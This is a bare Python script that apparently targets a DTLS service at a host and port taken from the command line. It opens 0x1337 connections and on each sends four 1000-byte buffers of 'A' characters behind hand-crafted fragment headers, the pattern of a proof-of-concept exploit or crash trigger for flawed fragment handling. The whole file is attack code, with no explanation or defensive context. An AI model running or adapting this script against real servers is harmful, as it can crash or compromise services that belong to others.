import ssl
import struct
import sys
from socket import socket, AF_INET, SOCK_DGRAM
from dtls import do_patch, sslconnection
host = sys.argv[1]
port = int(sys.argv[2])
do_patch()
for i in range(0, 0x1337):
    sock = ssl.wrap_socket(socket(AF_INET, SOCK_DGRAM))
    setattr(sock, "ssl_version", sslconnection.PROTOCOL_DTLSv1)
    sock.connect((host, port))
    for j in range(0, 4):
        fragment = "A" * 1000
        _buffer = struct.pack(
            "<HHHHH",
            5,                  # id
            len(fragment) + 6,  # full packet
            i,                  # fragment id
            i,                  # number of fragments
            1000                # length of a fragment
        )
        _buffer += fragment
        sock.write(_buffer)